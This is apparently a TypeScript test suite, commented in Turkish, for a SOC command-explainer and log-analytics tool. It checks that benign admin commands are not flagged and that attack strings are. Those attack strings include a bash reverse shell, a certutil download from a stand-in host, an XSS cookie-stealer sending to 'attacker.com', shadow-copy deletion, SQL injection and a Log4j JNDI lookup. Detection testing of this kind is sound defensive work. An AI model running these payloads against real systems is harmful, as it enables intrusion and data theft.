import { explainCommand } from '../services/commandExplainer';
import { generateQradarCustomRules, detectLogNature } from '../services/qradarAqlHelper';
import { splitRawTextIntoEvents, extractWindowsDetails, generateTailoredExtraInfo } from '../services/quickTriageHelper';
import { runAnalytics } from '../services/socEngine';
import { NormalizedLog } from '../types';

/**
 * DEEP PRECISION & ADVERSARIAL VALIDATION TEST SUITE
 * 
 * Amaç:
 * 1. Sıfır Yanlış Tespit (Zero False Positives): Meşru sistem/admin komutları ve sorguları asla siber saldırı sanılmamalı.
 * 2. Sıfır Yanlış Kural Önerme (Zero Inappropriate Mitigations): İç IP'lere dış firewall engeli önerilmemeli, EDR izolasyonu önerilmeli.
 * 3. Yüksek Hasılatlı Doğru Tespit (True Positives & Obfuscation Resilience): Base64, LOLBAS, Ransomware, SQLi, Reverse Shell eksiksiz yakalanmalı.
 * 4. Çok Satırlı ve Çok Formatlı Ayrıştırma Bütünlüğü (Parsing & Schema Integrity).
 */

let totalTests = 0;
let passedTests = 0;
let failedTests = 0;

function assert(condition: boolean, testName: string, detail?: string) {
  totalTests++;
  if (condition) {
    passedTests++;
    console.log(`  [PASS] ${testName}`);
  } else {
    failedTests++;
    console.error(`  [FAIL] ${testName}${detail ? ` - ${detail}` : ''}`);
  }
}

console.log('================================================================');
console.log('⚡ SOC ENGINE & COMMAND EXPLAINER DERİN VE ZORLAYICI DOĞRULAMA ⚡');
console.log('================================================================\n');

// -----------------------------------------------------------------------------
// BÖLÜM 1: ZORLAYICI YANLIŞ TESPİT (FALSE POSITIVE) ÖNLEME TESTLERİ
// -----------------------------------------------------------------------------
console.log('--- Bölüm 1: Meşru Komutların Yanlış Tehdit Olarak Sınıflandırılmaması ---');

// 1.1: Meşru Linux Admin Komutu
const resNginx = explainCommand('systemctl status nginx');
assert(resNginx.riskLevel === 'BİLGİ', 'Test 1.1: "systemctl status nginx" riski BİLGİ seviyesindedir');
assert(resNginx.category.includes('Sistem') || resNginx.category.includes('Yönetim'), 'Test 1.2: "systemctl status nginx" yönetim komutu olarak tanımlanır');

// 1.2: Meşru Docker Komutu
const resDocker = explainCommand('docker ps -a --format "table {{.ID}}\t{{.Names}}"');
assert(resDocker.riskLevel === 'BİLGİ', 'Test 1.3: "docker ps -a" riski BİLGİ seviyesindedir');

// 1.3: Meşru Git Operasyonu
const resGit = explainCommand('git checkout -b feature/threat-intel');
assert(resGit.riskLevel === 'BİLGİ', 'Test 1.4: "git checkout" riski BİLGİ seviyesindedir');

// 1.4: Meşru PowerShell Boru Hattı (Select-Object asla SQL Injection sanılmamalı!)
const resPsSelect = explainCommand('powershell -Command "Get-Process | Where-Object {$_.CPU -gt 10} | Select-Object -First 5"');
assert(resPsSelect.category !== 'SQL Enjeksiyonu (SQL Injection - SQLi)', 'Test 1.5: PowerShell "Select-Object" SQL Injection SANILMAZ');
assert(resPsSelect.riskLevel !== 'KRİTİK', 'Test 1.6: Rutin PowerShell süreci KRİTİK risk olarak işaretlenmez');

// 1.5: Meşru Veritabanı Sorgusu (SELECT ... FROM tablosu asla saldırı enjeksiyonu sanılmamalı!)
const resSqlLegit = explainCommand('SELECT timestamp, client_ip, count(*) FROM events GROUP BY client_ip HAVING count(*) > 10');
assert(resSqlLegit.category === 'Veritabanı Sorgusu (SQL Query)', 'Test 1.7: Normal SQL sorgusu "Veritabanı Sorgusu" olarak etiketlenir');
assert(resSqlLegit.riskLevel === 'BİLGİ', 'Test 1.8: Normal SQL sorgusunun risk seviyesi BİLGİ’dir (Asla KRİTİK değil)');

// 1.6: Meşru Ağ Tanılama Komutu
const resIpconfig = explainCommand('ipconfig /all');
assert(resIpconfig.riskLevel === 'BİLGİ', 'Test 1.9: "ipconfig /all" riski BİLGİ olarak kalır');

// -----------------------------------------------------------------------------
// BÖLÜM 2: GELİŞMİŞ VE KARMAŞIK SALDIRI TESPİTİ (TRUE POSITIVES & OBFUSCATION)
// -----------------------------------------------------------------------------
console.log('\n--- Bölüm 2: Gizlenmiş ve Karmaşık Saldırıların Tam Tespiti ---');

// 2.1: PowerShell Base64 Obfuscated Dropper
// Payload içeriği: "$client = New-Object System.Net.WebClient" (Unicode LE Base64)
const b64PsCmd = 'powershell.exe -nop -w hidden -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0AA==';
const resPsDropper = explainCommand(b64PsCmd);
assert(resPsDropper.riskLevel === 'KRİTİK', 'Test 2.1: Gizlenmiş PowerShell dropper KRİTİK risk düzeyindedir');
assert(resPsDropper.decodedPayload !== undefined && resPsDropper.decodedPayload.includes('WebClient'), 'Test 2.2: Base64 payload otomatik olarak çözüldü ve WebClient tespit edildi');
assert(resPsDropper.mitreTechnique?.includes('T1059.001') === true, 'Test 2.3: MITRE T1059.001 PowerShell tekniği atandı');

// 2.2: Ransomware Volume Shadow Copy Silme (vssadmin)
const resVss = explainCommand('vssadmin.exe delete shadows /all /quiet');
assert(resVss.riskLevel === 'KRİTİK', 'Test 2.4: vssadmin gölge kopya silme KRİTİK risk olarak işaretlendi');
assert(resVss.mitreTechnique?.includes('T1490') === true, 'Test 2.5: MITRE T1490 (Inhibit System Recovery) atandı');
assert(resVss.tokens.some(t => t.token === '/quiet'), 'Test 2.6: "/quiet" sessiz parametresi token analizine yansıdı');

// 2.3: LOLBAS Certutil Dosya İndirme
const resCertutil = explainCommand('certutil.exe -urlcache -split -f http://malicious.evil/agent.exe agent.exe');
assert(resCertutil.riskLevel === 'YÜKSEK', 'Test 2.7: Certutil LOLBAS dosya indirme YÜKSEK risk olarak işaretlendi');
assert(resCertutil.mitreTechnique?.includes('T1105') === true, 'Test 2.8: MITRE T1105 (Ingress Tool Transfer) atandı');

// 2.4: Linux Interactive Reverse Shell
const resRevShell = explainCommand('bash -i >& /dev/tcp/198.51.100.4/4444 0>&1');
assert(resRevShell.riskLevel === 'KRİTİK', 'Test 2.9: Linux ters kabuk (/dev/tcp) KRİTİK risk olarak işaretlendi');
assert(resRevShell.category.includes('Ters Kabuk') || resRevShell.category.includes('Reverse Shell'), 'Test 2.10: Ters Kabuk kategorisi atandı');

// 2.5: Karmaşık Union-Based SQL Injection
const resSqli = explainCommand("admin' UNION ALL SELECT 1, null, table_name, column_name FROM information_schema.columns WHERE '1'='1");
assert(resSqli.riskLevel === 'KRİTİK', 'Test 2.11: Karmaşık Union SQLi KRİTİK risk olarak işaretlendi');
assert(resSqli.category.includes('SQL Enjeksiyonu'), 'Test 2.12: Kategori "SQL Enjeksiyonu" olarak tespit edildi');

// 2.6: Zaman Gecikmeli Blind SQL Injection
const resBlindSqli = explainCommand("1'; WAITFOR DELAY '0:0:10'--");
assert(resBlindSqli.riskLevel === 'KRİTİK', 'Test 2.13: Zaman gecikmeli (Blind) SQLi KRİTİK risk olarak işaretlendi');

// 2.7: XSS Script Enjeksiyonu
const resXss = explainCommand('<script>document.location="http://attacker.com/steal?c="+document.cookie</script>');
assert(resXss.riskLevel === 'YÜKSEK', 'Test 2.14: XSS saldırısı YÜKSEK risk olarak işaretlendi');
assert(resXss.mitreTechnique?.includes('T1059.007') === true, 'Test 2.15: MITRE T1059.007 JavaScript atandı');

// -----------------------------------------------------------------------------
// BÖLÜM 3: YANLIŞ KURAL VE SAVUNMA ÖNERİLERİNİN ÖNLENMESİ TESTLERİ
// -----------------------------------------------------------------------------
console.log('\n--- Bölüm 3: Yanlış Savunma ve Kural Önerilerini Engelleme ---');

// 3.1: Dahili IP için Sınır Güvenlik Duvarı YERİNE EDR / İç İzolasyon Önerilmeli
const internalRules = generateQradarCustomRules({
  ip: '192.168.1.45',
  rawLog: 'Firewall Deny 192.168.1.45 -> 10.0.0.1:445',
});
const internalPortScanRule = internalRules.find(r => r.id === 'cre_fw_port_scan_spike');
assert(internalPortScanRule !== undefined, 'Test 3.1: Dahili IP için kural üretildi');
assert(
  internalPortScanRule?.ruleActionDescription.includes('EDR uç nokta ağ izolasyonu') === true,
  'Test 3.2: Dahili IP için Sınır Firewall yerine EDR Uç Nokta İzolasyonu önerildi'
);
assert(
  internalPortScanRule?.ruleName.includes('Dahili Kaynak IP') === true,
  'Test 3.3: Kural başlığı "Dahili Kaynak IP" olarak ayrıştırıldı'
);

// 3.2: Dış Tehdit IP için Sınır Güvenlik Duvarı (Perimeter FW) Engelleme Önerilmeli
const externalRules = generateQradarCustomRules({
  ip: '185.220.101.5',
  rawLog: 'Firewall Deny 185.220.101.5 -> 10.0.0.1:445',
});
const externalPortScanRule = externalRules.find(r => r.id === 'cre_fw_port_scan_spike');
assert(
  externalPortScanRule?.ruleActionDescription.includes('Sınır Güvenlik Duvarı IP Engelleme') === true,
  'Test 3.4: Dış IP için Sınır Güvenlik Duvarı (Perimeter FW) engeli önerildi'
);

// 3.3: 404 Web Tarayıcı Kuralında Yetkili Tarayıcı İstisnası Olmalı
const webRules = generateQradarCustomRules({
  method: 'GET',
  url: '/admin/config.php',
  statusCode: 404,
  rawLog: '198.51.100.22 - - [23/Sep/2026:10:00:00] "GET /admin/config.php HTTP/1.1" 404 120',
});
const scannerRule = webRules.find(r => r.id === 'cre_web_403_scanner');
assert(
  scannerRule?.ruleTestConditions.some(c => c.includes('Authorized-Scanners') || c.includes('Internal-Vulnerability-Scanners')) === true,
  'Test 3.5: Web 404 dizin tarayıcı kuralında meşru iç tarayıcılar (Authorized-Scanners) istisna edildi'
);

// -----------------------------------------------------------------------------
// BÖLÜM 4: ÇOK SATIRLI VE ÇOK FORMATLI AYRIŞTIRMA BÜTÜNLÜĞÜ
// -----------------------------------------------------------------------------
console.log('\n--- Bölüm 4: Çok Satırlı Ayrıştırma ve Şema İzolasyonu ---');

// 4.1: Bölümler arasında birden fazla boş satır barındıran tek bir Windows 4625 olayı
const rawWindowsPaste = `
Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Event ID:      4625
Task Category: Logon
Level:         Information
Keywords:      Audit Failure
Computer:      CORP-DC-01.corp.local

Subject:
	Security ID:		S-1-0-0
	Account Name:		-

Logon Type:			3

Account For Which Logon Failed:
	Security ID:		S-1-0-0
	Account Name:		tekin.donmez
	Account Domain:		CORP

Failure Information:
	Failure Reason:		Unknown user name or bad password.
	Status:			0xC000006D
	Sub Status:		0xC0000064

Network Information:
	Workstation Name:	WORKSTATION-88
	Source Network Address:	10.10.40.105
	Source Port:		52140
`;

const eventsList = splitRawTextIntoEvents(rawWindowsPaste);
assert(eventsList.length === 1, 'Test 4.1: Boş satırlarla ayrılmış 6 bölümden oluşan olay tek 1 blok olarak ayrıştırıldı');

const parsedWin = extractWindowsDetails(eventsList[0], {}, null);
assert(parsedWin.eventId === 4625, 'Test 4.2: Event ID 4625 doğru okundu');
assert(parsedWin.targetUser === 'tekin.donmez', 'Test 4.3: Hedef kullanıcı "tekin.donmez" doğru okundu');
assert(parsedWin.subStatus === '0XC0000064', 'Test 4.4: SubStatus "0xC0000064" (Böyle bir hesap yok) doğru okundu');
assert(parsedWin.subStatusDesc.toLowerCase().includes('mevcut değil') || parsedWin.subStatusDesc.includes('Bilinmeyen'), 'Test 4.5: SubStatus açıklaması kullanıcı yokluğu ile eşleşti');
assert(parsedWin.workstation === 'WORKSTATION-88', 'Test 4.6: Workstation adı WORKSTATION-88 doğru okundu');
assert(parsedWin.sourceIp === '10.10.40.105', 'Test 4.7: Kaynak IP 10.10.40.105 doğru okundu');

// 4.2: İki farklı bağımsız logun aynı paste içine konulması (Multi-log paste)
const multiRawPaste = `192.168.1.10 - - [23/Sep/2026:10:00:00 +0300] "GET /index.php HTTP/1.1" 200 1420
192.168.1.11 - - [23/Sep/2026:10:00:01 +0300] "POST /api/login HTTP/1.1" 401 230`;

const multiEvents = splitRawTextIntoEvents(multiRawPaste);
assert(multiEvents.length === 2, 'Test 4.8: İki ayrı tek satırlı web isteği 2 bağımsız olay olarak ayrıştırıldı');

// -----------------------------------------------------------------------------
// BÖLÜM 5: SOC ENGINE KORELASYON VE ADLİ ANALİZ MATRİSİ
// -----------------------------------------------------------------------------
console.log('\n--- Bölüm 5: SOC Engine Adli Analiz ve Yanlış Alarm Önleme ---');

// 5.1: Normal Apache Web İsteği (GET /app.js 200) -> Asla saldırı sanılmamalı
const normalLog: NormalizedLog = {
  id: 'test-norm-1',
  raw: '192.168.1.50 - - [23/Sep/2026:10:15:00 +0300] "GET /assets/main.js HTTP/1.1" 200 45200',
  zaman: '2026-09-23 10:15:00',
  istemci_ip: '192.168.1.50',
  istek_yolu: '/assets/main.js',
  http_metodu: 'GET',
  durum_kodu: 200,
  yanit_boyutu: 45200,
  kullanici_ajani: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
  sunucu_ismi: 'WEB-PROD-01',
  format: 'Apache Combined',
  islem_komutu: 'GET /assets/main.js',
  tehdit_kategorisi: 'Normal',
  risk_skoru: 0,
};

const reportNorm = runAnalytics([normalLog], 10485760, 15, 'BALANCED');
assert(reportNorm.entity_risk_queue.length === 0, 'Test 5.1: Normal JS indirme için risk kuyruğu boştur (Sıfır riskli varlık)');
assert(reportNorm.suspicious_commands.length === 0, 'Test 5.2: Normal JS indirme için sıfır şüpheli komut');

// 5.2: Log4j CVE-2021-44228 Saldırısı İstismarı
const log4jLog: NormalizedLog = {
  id: 'test-log4j-1',
  raw: '185.220.101.4 - - [23/Sep/2026:10:20:00 +0300] "GET /api?user=${jndi:ldap://198.51.100.22:1389/Exploit} HTTP/1.1" 200 520',
  zaman: '2026-09-23 10:20:00',
  ip_adresi: '185.220.101.4',
  istemci_ip: '185.220.101.4',
  istek_yolu: '/api?user=${jndi:ldap://198.51.100.22:1389/Exploit}',
  http_metodu: 'GET',
  durum_kodu: 200,
  yanit_boyutu: 520,
  kullanici_ajani: 'Custom-Attacker/1.0',
  sunucu_ismi: 'WEB-PROD-01',
  format: 'Apache Combined',
  islem_komutu: 'GET /api?user=${jndi:ldap://198.51.100.22:1389/Exploit}',
  tehdit_kategorisi: 'RCE / Exploit',
  risk_skoru: 95,
};

const reportLog4j = runAnalytics([log4jLog], 10485760, 15, 'BALANCED');
assert(
  reportLog4j.suspicious_commands.length > 0 || reportLog4j.entity_risk_queue.length > 0,
  'Test 5.3: Log4j JNDI saldırısı şüpheli komut veya risk kuyruğunda yakalandı'
);
assert(
  reportLog4j.entity_risk_queue.some(e => e.ip_adresi === '185.220.101.4' && e.risk_puani >= 25),
  'Test 5.4: Saldırgan IP risk skorlamasında önceliklendirildi'
);

console.log('\n================================================================');
console.log(`BİTİŞ ÖZETİ: ${passedTests} / ${totalTests} test başarıyla tamamlandı! (${failedTests} hata)`);
console.log('================================================================');

if (failedTests > 0) {
  process.exit(1);
} else {
  process.exit(0);
}
